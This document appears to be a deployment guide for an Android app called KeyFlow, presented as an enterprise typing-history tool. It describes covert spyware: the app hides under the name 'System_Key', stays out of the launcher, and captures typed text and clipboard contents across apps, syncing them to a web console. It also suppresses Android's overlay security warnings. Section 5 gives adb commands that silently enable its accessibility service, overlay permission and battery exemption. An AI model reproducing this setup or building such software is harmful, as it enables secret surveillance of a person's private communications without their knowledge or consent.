# KeyFlow Enterprise: Client Deployment & Operational Guide (v1.0.0-rc)

This comprehensive guide details the deployment, configuration, security posture, and verification workflows for the **KeyFlow Enterprise System** on Android (Motorola Edge 40 / physical targets) and the Web Management Console.

---

## 1. System Overview & Architecture

KeyFlow is an enterprise-grade, local-first typing history and intelligent session recovery engine designed to run seamlessly in the background with zero user intrusion.

### Key Architectural Pillars:
- **Headless Utility Presence**: Disguised under system utility metadata (`android:label="System_Key"`), omitted from the standard application launcher drawer to avoid desktop clutter.
- **Zero-Knowledge Local Storage**: Local database backed by **SQLCipher (AES-256)** using encryption keys derived from authenticated user sessions and anchored in the **Android Hardware Keystore**.
- **Hardware-Level Privacy Filters**: Automatic dropping and node recycling for all credential fields (`isPassword == true`, PINs, OTPs).
- **Financial App Zero-Interference**: Instant package-level bypass (`return`) for banking, payment, and UPI applications with automatic overlay dismissal to eliminate tapjacking alerts.
- **Intelligent Paragraph Debouncing**: In-memory 2.5-second inactivity timer consolidating multi-line inputs into cohesive paragraph blocks, eliminating single-keystroke clutter.

---

## 2. Launching in Headless Mode

Because KeyFlow is configured as a system background utility (`System_Key`), it does not clutter the user's primary application drawer (`android.intent.category.LAUNCHER` is omitted). Three standard enterprise launch vectors are supported:

### Method A: Native Android App Settings (Primary)
1. Open device **Settings** -> **Apps** (or **App Management**).
2. Select **System_Key** (or **KeyFlow**).
3. Tap the native **"Open"** button.
4. The application directly presents the credential unlock / history console.

### Method B: Quick Settings Tile
1. Swipe down twice from the top of the screen to reveal the Android **Quick Settings Panel**.
2. Tap the pencil / edit icon to customize tiles.
3. Locate the **System Key** tile and drag it to the active tile area.
4. Single-tap the **System Key** tile at any time to collapse notification shades and immediately open the credential unlock screen.

### Method C: Custom Deep-Link Scheme
KeyFlow registers custom enterprise URI schemes:
- `keyflow://open`
- `keyflow://vault/open`

Triggering this URI from any internal portal, browser, or enterprise MDM intent immediately opens the secure console:
```bash
adb shell am start -a android.intent.action.VIEW -d "keyflow://vault/open"
```

---

## 3. Security & Cryptographic Guarantees

### 3.1. SQLCipher Hardware Keystore Encryption
- Database file: `keyflow_encrypted.db` located in private app storage.
- Key Storage: Managed via `flutter_secure_storage` utilizing `AndroidOptions(encryptedSharedPreferences: true)`.
- Keystore Anchor: The master encryption key is generated with hardware entropy and stored in the Android Hardware Keystore (TEE/StrongBox).
- Session Derivation: Key derivation binds the active user credentials and session entropy.
- Inspection Verification: Any direct attempt to inspect `keyflow_encrypted.db` using standard SQLite tooling returns:
  ```
  Error: file is encrypted or is not a database
  ```
- Unauthenticated Protection: All read/write operations require a verified authenticated session; zero data is decipherable without valid credentials.

### 3.2. Financial App & Banking Exclusions
Before evaluating any window node hierarchies, KeyFlow inspects `event.packageName`:
- **Pre-Filtered Packages**:
  - Google Pay (`com.google.android.apps.nbu.paisa.user`)
  - PhonePe (`com.phonepe.app`)
  - Paytm (`net.one97.paytm`)
  - BHIM (`in.org.npci.upiapp`)
  - Major Banks (`com.sbi.upi`, `com.icicibank.imobile`, `com.hdfcbank.corebanking`, `com.axis.mobile`, `com.kotak.imb`)
  - Regex Catch-All: `.*(bank|upi|payment|wallet|creditcard|authenticator).*`
- **Zero Tapjacking Warnings**: If an overlay element is active, KeyFlow immediately issues `rootContainer.visibility = View.GONE` to prevent Android `filterTouchesWhenObscured` security popups.
- **Zero Data Ingestion**: All events from excluded packages trigger immediate `return` before any text parsing occurs.

### 3.3. Hardware Password & PIN Drop
- If `event.isPassword == true` or `sourceNode.isPassword == true` or `inputType` matches `TYPE_TEXT_VARIATION_PASSWORD`, `TYPE_NUMBER_VARIATION_PASSWORD`, or PIN/OTP patterns:
  1. `sourceNode.recycle()` is immediately called.
  2. The event is discarded immediately.
  3. 0 bytes are buffered, logged, or synchronized.

---

## 4. Session Aggregation & Debounce Engine

Single-keystroke recording produces extreme noise and performance degradation. KeyFlow implements an in-memory aggregation engine:

### 4.1. Data Organization Hierarchy:
```
Session (Date / Device) -> Application Name -> Consolidated Paragraph Block
```

### 4.2. Inactivity Debounce (2.5s):
- While the user types, input is aggregated in memory without disk or network I/O.
- Once 2.5 seconds of typing silence occurs, the unified paragraph card is committed to encrypted SQLite and dispatched to the cloud sync stream.

### 4.3. Session Boundary Triggers:
An active typing session is sealed into a finalized paragraph card when:
1. **Application Switch**: User switches from App A (e.g., Keep Notes) to App B (e.g., Slack).
2. **Inactivity Timeout**: More than 60 seconds elapse between typing bursts.
3. **Input Submission / Focus Loss**: The active editable field is submitted or loses focus.

---

## 5. Physical Device Installation & Setup

### Prerequisites:
- Target Android device running Android 10+ (Tested: Motorola Edge 40 on Android 15, API 35).
- USB Debugging enabled.

### 5.1. Install Application Package:
```bash
adb -s <DEVICE_ID> install -r app/build/app/outputs/flutter-apk/app-debug.apk
```

### 5.2. Grant Necessary System Permissions:
```bash
# Enable Accessibility Service
adb -s <DEVICE_ID> shell settings put secure enabled_accessibility_services com.keyflow.keyflow_app/com.keyflow.keyflow_app.KeyflowAccessibilityService:com.keyflow.keyflow_app/.KeyflowAccessibilityService
adb -s <DEVICE_ID> shell settings put secure accessibility_enabled 1

# Grant Post-Notifications and System Alert Window
adb -s <DEVICE_ID> shell pm grant com.keyflow.keyflow_app android.permission.POST_NOTIFICATIONS
adb -s <DEVICE_ID> shell appops set com.keyflow.keyflow_app SYSTEM_ALERT_WINDOW allow

# Battery Optimization Whitelist (prevents OS termination)
adb -s <DEVICE_ID> shell dumpsys deviceidle whitelist +com.keyflow.keyflow_app
```

---

## 6. End-to-End Verification Procedures

### Step 1: Account Login
1. Launch **System_Key** via App Info or Quick Settings Tile.
2. Sign in with your registered account credentials (e.g., `user@keyflow.dev` / `SecurePassword123!`).
3. Verify that the Home Screen displays the active sync indicator.

### Step 2: Paragraph Aggregation & Debounce (TC-01)
1. Open Google Keep or any text editor.
2. Type a multi-line paragraph: `"KeyFlow intelligent session aggregation test: complete paragraphs sync across devices."`
3. Pause typing for 3 seconds.
4. On the Web Console (`http://localhost:5173` or production dashboard), verify that **exactly 1 unified card** appears with character and word count statistics. Confirm zero single-character noise.

### Step 3: Financial App Zero-Interference (TC-02)
1. Open Google Pay, PhonePe, Paytm, or any banking app.
2. Verify that no overlay obscures the screen, no warning dialog appears, and touch interactions are 100% fluid.
3. Check the audit logs: 0 bytes and 0 entries recorded.

### Step 4: Password Field Protection (TC-03)
1. Navigate to a login screen or password input field.
2. Type a secure password.
3. Check history: 0 characters appear in encrypted SQLite or Web Console feeds.

### Step 5: Clipboard Cross-Device Sync (TC-04)
1. Copy a URL or snippet on the mobile device.
2. Observe the Web Console **Clipboard History** tab: the copied record appears in real time with a 1-Click Copy option.

---

## 7. Delivery Artifacts & Video Evidence

- **Master E2E Synchronized Video**: `demo_recordings/master_e2e_sync_demo.mp4`  
  *Dual-pane split showing physical Motorola Edge 40 on the left and authenticated Web Dashboard on the right.*
- **Client Setup & Feature Tutorial**: `demo_recordings/client_setup_tutorial.mp4`  
  *Step-by-step walkthrough covering launch via App Info/Tile, login, paragraph aggregation, and privacy filters.*
- **Automated Verification Script**: `python scripts/master_e2e_retest_and_record.py`
